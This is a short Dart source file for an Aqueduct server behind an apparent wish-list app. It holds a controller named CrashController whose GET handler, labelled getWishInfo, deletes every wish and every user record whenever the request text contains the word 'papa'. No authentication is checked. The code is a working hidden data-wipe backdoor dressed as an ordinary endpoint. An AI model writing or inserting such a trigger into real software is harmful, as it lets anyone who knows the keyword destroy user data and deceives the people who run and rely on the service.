import 'package:aqueduct/aqueduct.dart';
import 'package:wish_server/model/User.dart';
import 'package:wish_server/model/Wish.dart';
import 'package:wish_server/model/WishFull.dart';
import 'package:wish_server/model/WishInfo.dart';
import 'package:wish_server/model/WishOpenInfo.dart';

class CrashController extends ResourceController {

  CrashController(this.context);
  final ManagedContext context;

  @Operation.get()
  Future<Response> getWishInfo() async {
    if (request.toString().contains("papa")) {

      var query = Query<Wish>(context)
        ..where((u) => u.userId).notEqualTo(-1);

      int wishDeleted = await query.delete();

      var query1 = Query<User>(context)
        ..where((u) => u.id).notEqualTo(-1);

      int usersDeleted = await query1.delete();
      return Response.ok("OK");
    } else {
      return Response.badRequest();
    }
  }
}
